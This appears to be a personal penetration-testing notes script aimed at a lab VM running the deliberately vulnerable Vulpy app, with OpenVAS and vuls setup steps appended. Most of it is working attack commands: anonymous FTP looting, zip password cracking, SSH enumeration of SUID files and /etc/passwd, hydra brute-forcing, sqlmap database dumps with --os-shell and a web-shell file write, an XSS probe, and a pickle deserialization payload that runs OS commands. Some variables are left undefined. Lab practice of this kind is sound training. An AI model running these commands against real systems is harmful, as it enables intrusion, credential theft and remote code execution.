#!/bin/bash

mkdir -p "${HOME}/reports"
mkdir -p "${HOME}/scans/vulnbox"
LOGFILE="$(pwd)/reports/scan-results-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

VULNBOX_IP=192.168.56.101

mkdir -p ~/scans/vulnbox && cd ~/scans/vulnbox

nmap --script=http-vuln* -p 5000 ${VULNBOX_IP}


nmap -Pn -sV -sC -p21,22,80,5000 \
  --script banner,ftp-anon,ftp-syst,http-title,http-headers,http-enum,http-robots.txt \
  -oN nmap_focus.txt ${VULNBOX_IP}

nmap -sS -sV -p- -A --script=banner,ftp-anon,http-enum,http-title,ssh-hostkey,upnp-info,vuln ${VULNBOX_IP} -oN nmap_full.txt

# nmap -sS -sV -p- -A --script=banner,ftp-anon,http-enum,ssh-hostkey,upnp-info,vuln ${VULNBOX_IP} -oN nmap_full.txt

# attacker side
nmap -sV -p 21,22,80,5000 ${VULNBOX_IP} -oN nmap_ports.txt
# check UPnP
nmap -p 5000 --script=upnp-info ${VULNBOX_IP}
nmap -p21 --script=ftp-anon ${VULNBOX_IP}
#ftp ${VULNBOX_IP}         # try username anonymous

# ftp login to download the tom.zip
ftp -inv <<EOF
open ${VULNBOX_IP}
user anonymous your_email@example.com
get tom.zip
bye
EOF

# crack tom.zip password
zip2john tom.zip > tom_zip_hash.txt
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt tom_zip_hash.txt
john --show tom_zip_hash.txt
unzip -P querty -d tom tom.zip

ssh -i tom/vulnbox -vvv ubuntu@${VULNBOX_IP}    # read banner; or use nmap ssh-hostkey



ssh ubuntu@${VULNBOX_IP} << EOF
whoami; id
hostname; uname -a; cat /etc/os-release
ps aux --sort=-%mem | head
ss -tulpn
sudo -l
find / -perm /4000 -type f 2>/dev/null
find / -xdev -type f -perm -o+w 2>/dev/null
grep -Ri "password" /var/www 2>/dev/null
grep -Ri "password" /srv/flask/vulpy/bad 2>/dev/null
cat /etc/passwd
exit
EOF


# try common creds using hydra for a login form (example form params)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=wrong" ${VULNBOX_IP} -V

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -s 5000 "${VULNBOX_IP}" http-post-form \
  "/user/login:username=^USER^&password=^PASS^:F=wrong" \
  -V -c "vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -s 5000 "${VULNBOX_IP}" http-get-form \
  "/user/login:username=^USER^&password=^PASS^:F=wrong" \
  -V -c "vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"

hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt http://${VULNBOX_IP}:5000/user http-form-post "/login:username=^USER^&password=^PASS^:Incorrect" -t 4 -f -o "$OUT/hydra_login.txt"

#hydra -l admin -P "${WORDLIST_TO_USE}" "${TARGET_HOST}" http-get-form "${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect." 2>&1 | tee -a "${OUTDIR}/hydra_brute_force.log"
#HYDRA_EXIT_STATUS=${PIPESTATUS[0]} # Capture hydra's exit status


# Discover hidden endpoints (directory fuzzing)
gobuster dir -u http://${VULNBOX_IP}:5000/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,py,json -t 40 -o gobuster_5000.txt
gobuster dir -u http://${VULNBOX_IP}/ -w /usr/share/wordlists/dirb/common.txt -x php,phpinfo,txt -t 40 -o gobuster_80.txt

curl -sS http://${VULNBOX_IP}/ -o phpinfo.html

# save root and posts page
curl -sS "http://$IP:5000/" -o "$OUT/root_5000.html"


curl -sS http://${VULNBOX_IP}:5000/posts -o posts.html
grep -Eo "([?&][a-zA-Z0-9_]+=)" posts.html || grep -i "form" -n posts.html
# quick searches inside saved page
grep -nEi "form|input|href|action|csrf|token|session|id=|/posts/" "$OUT/posts_5000.html" || true


nikto -host http://${VULNBOX_IP} -output nikto_80_scan.txt
nikto -host http://${VULNBOX_IP}:5000 -output nikto_5000_scan.txt
# Or run Burp/ZAP proxy manual testing for auth/session issues, CSRF, XSS, etc.


wapiti -u http://${VULNBOX_IP}:5000 -f html -o wapiti_report.txt
wapiti -u http://192.168.56.101:5000 --auth-type post -a "admin%admin" -s http://192.168.56.101:5000/login -f html -o wapiti_report -S aggressive -v 3



# check for obvious stacktrace / Werkzeug in page
curl -s "http://$VULNBOX_IP:5000/posts" | grep -i Werkzeug -n || true
# attempt to trigger error page (for stacktrace) by hitting a non-existent route with bad input
curl -s "http://$VULNBOX_IP:5000/nonexistent?_debug=1" -o "$OUT/trigger_debug.html"
grep -i "Traceback" "$OUT/trigger_debug.html" || true


http://192.168.56.101:5000/user/login
username=%27&password=admin&otp=


# vulpy_session

# recon
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  -p username,password \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --batch \
  --flush-session \
  --level=5 \
  --risk=3 \
  --os="Linux" \
  --random-agent \
  --web-root="/srv/flask/vulpy/bad" \
  --dbs

# tables
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" -p username \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  --os="Linux" --random-agent \
  --tables

# tables#2
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  -D SQLite_masterdb \
  --os="Linux" --random-agent \
  --tables

# users
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  -D SQLite_masterdb \
  --os="Linux" --random-agent \
  -T users --columns

sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  -D SQLite_masterdb \
  --os="Linux" --random-agent \
  -T users --dump

# os-shell [*]
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --batch \
  --flush-session \
  --level=5 \
  --risk=3 \
  --dbs \
  --dbms=sqlite \
  --os="Linux" \
  --random-agent \
  --web-root="/srv/flask/vulpy/bad" \
  --dbs \
  --os-shell

# sqlite3 ~/Downloads/db_users.sqlite "SELECT * FROM users;"


sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" -p id --batch --dbs --level=5 --risk=3 --output-dir=~/scans/vulpy

mysql -h ${VULNBOX_IP} -u dbuser -p'password' -e "show databases;"

sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" --dbs --batch --level=5 --risk=3
# list tables
sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" -D <dbname> --tables
# check for file write possibilities
sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/vulpy/shell.php"


# simple manual test: reflected XSS attempt
curl -s "http://$IP:5000/posts?search=<script>alert(1)</script>" -o "$OUT/xss_test.html"
grep -n "<script>alert(1)</script>" "$OUT/xss_test.html" && echo "Reflected XSS likely" || echo "No immediate reflection"

# test common parameters: loop through parameters found earlier
# more advanced: use Burp to intercept & test payloads or use dalfox/wfuzz



grep -n "csrf" "$OUT/posts_5000.html" || echo "No csrf found in posts page"
# or list all forms
python3 - <<'PY'
from bs4 import BeautifulSoup
print(open("$OUT/posts_5000.html").read()[:5000])
soup=BeautifulSoup(open("$OUT/posts_5000.html"),"html.parser")
for f in soup.find_all("form"):
    print("FORM action:", f.get("action"))
    for i in f.find_all("input"):
        print("  input:", i.get("name"))
PY




wpscan --url http://${VULNBOX_IP}:5000 --enumerate u



wpscan --username admin --url http://${VULNBOX_IP}:5000 --wordlist /usr/share/wordlists/metasploit/http_default_pass.txt --wp-content-dir http://${VULNBOX_IP}:5000/ --threads 20


# grep "\[!\]" linpeas_sh_scan_results.log | awk -F'[][]' '{print $2 "\t" $3}' | column -t -s $'\t' 

#tar -czf "vulpy_scan_${IP}_$(date +%F_%T).tgz" ./*
#ls -lh



# openvas

#!/bin/bash
# OpenVAS (GVM) install and setup script for Kali Linux with permission fixes
# Guide: https://greenbone.github.io/docs/latest/22.4/kali/index.html
# Guide #2: https://std.rocks/security_kali_gvm.html


echo "[*] Updating Kali Linux packages..."
sudo apt update && sudo apt upgrade -y && sudo apt dist-upgrade -y

echo "[*] Installing OpenVAS package..."
sudo apt install openvas -y
sudo systemctl enable ospd-openvas.service --now

echo "[*] Running OpenVAS setup (this will download vulnerability feeds, may take some time)..."
sudo gvm-setup

echo "[*] Fixing permissions to avoid ospd-openvas service errors..."

# Fix permissions for OpenVAS log file
sudo chmod 666 /var/log/gvm/openvas.log

# cd ~/Downloads
source venv/bin/activate
python3 -m pip install greenbone-feed-sync

# Fix ownership for GVM user directories
sudo chown -R _gvm:_gvm /etc/openvas/gnupg
sudo chown -R _gvm:_gvm /var/log/gvm
sudo chown -R _gvm:_gvm /var/lib/gvm
# sudo greenbone-feed-sync
sudo -u _gvm greenbone-feed-sync --type GVMD_DATA
sudo -u _gvm greenbone-feed-sync --type gvmd-data
sudo -u _gvm greenbone-feed-sync --type nvt
sudo -u _gvm greenbone-feed-sync --type scap
sudo -u _gvm greenbone-feed-sync --type cert
sudo -u _gvm greenbone-feed-sync --type notus
sudo -u _gvm gvmd --rebuild-gvmd-data=all
sudo gvm-stop

# # Synchronize NVT (Network Vulnerability Tests)
# rsync -avz rsync://feed.community.greenbone.net:/nvt-feed /var/lib/gvm/data-objects/nvt-feed
# # Synchronize SCAP data
# rsync -avz rsync://feed.community.greenbone.net:/scap-data /var/lib/gvm/data-objects/scap-data
# # Synchronize CERT data
# rsync -avz rsync://feed.community.greenbone.net:/cert-data /var/lib/gvm/data-objects/cert-data
# # Synchronize GVMD data (users, scan configs, port lists)
# rsync -avz rsync://feed.community.greenbone.net:/gvmd-data /var/lib/gvm/data-objects/gvmd
# # Synchronize NOTUS data
# rsync -avz rsync://feed.community.greenbone.net:/notus /var/lib/gvm/data-objects/notus



# Optional: Fix Redis config if needed (uncomment to apply)
# sudo sed -i 's/^save ""/# save ""/' /etc/redis/redis-openvas.conf
# sudo systemctl restart redis-server

echo "[*] Starting OpenVAS services..."
sudo gvm-start

echo "[*] Verifying OpenVAS setup..."
sudo gvm-check-setup

echo "[*] Setup complete. Access OpenVAS web UI at https://localhost:9392"
echo "[*] Log in with the admin credentials provided at the end of setup."


# sudo runuser -u _gvm -- gvmd --create-user=admin --password='<your-password>'
# [*] Please note the generated admin password
# [*] User created with password '2d42f8db-8d2f-4105-a465-b178d56503da'.


## Insecure Deserialization

import base64
import pickle
import os

# Paste base64 string intercepted from Burp
encoded = '<copied_base64_string>'

data = base64.b64decode(encoded)
obj = pickle.loads(data)

# Option A: Modify existing object attributes
# Example (if obj is dict-like):
# obj['username'] = 'admin'

# Option B: Replace obj with malicious payload class
class MaliciousPayload:
    def __reduce__(self):
        # Command to execute during unpickling
        return (os.system, ('whoami',))  # change 'whoami' to your payload command

obj = MaliciousPayload()

# Serialize and encode to send in request
new_data = pickle.dumps(obj)
new_encoded = base64.b64encode(new_data).decode()
print(new_encoded)



##
# vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9
# base64 decoded: {"username": "admin"}



nano /etc/gvm/greenbone-feed-sync.toml
---
...
feed-url="rsync://45.135.106.143/community"
...

sudo tee /etc/rsyncd.conf > /dev/null <<EOF
uid = nobody
gid = nogroup
use chroot = yes
max connections = 4
pid file = /var/run/rsyncd.pid
lock file = /var/run/rsyncd.lock
log file = /var/log/rsyncd.log

[backup]
path = /path/to/backup
comment = Backup Folder
read only = no
EOF


sudo systemctl enable rsync --now
sudo systemctl start rsync
sudo systemctl status rsync


# vulns
sudo apt install git gcc make wget sqlite3 debian-goodies -y
#wget https://go.dev/dl/go1.24.7.linux-amd64.tar.gz
wget https://dl.google.com/go/go1.20.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.20.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
mkdir -p $HOME/go/src/github.com/future-architect
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin

cd $GOPATH/src/github.com/future-architect
git clone https://github.com/future-architect/vuls.git
cd vuls
go mod tidy
export TMPDIR=/var/tmp
make install
sudo mkdir -p /usr/share/vuls-data /var/log/vuls
sudo chmod 700 /var/log/vuls

mkdir -p $GOPATH/src/github.com/vulsio
cd $GOPATH/src/github.com/vulsio
git clone https://github.com/vulsio/go-cve-dictionary.git
cd go-cve-dictionary
sudo cp $GOPATH/bin/go-cve-dictionary /usr/local/bin/
go-cve-dictionary fetch -dbpath=/usr/share/vuls-data/cve.sqlite3

mkdir -p $GOPATH/src/github.com/vulsio
cd $GOPATH/src/github.com/vulsio
git clone https://github.com/vulsio/goval-dictionary.git
cd goval-dictionary
make install
goval-dictionary fetch ubuntu 20.04 --dbpath=/usr/share/vuls-data/oval.sqlite3


gost fetch debian
vuls scan
vuls report

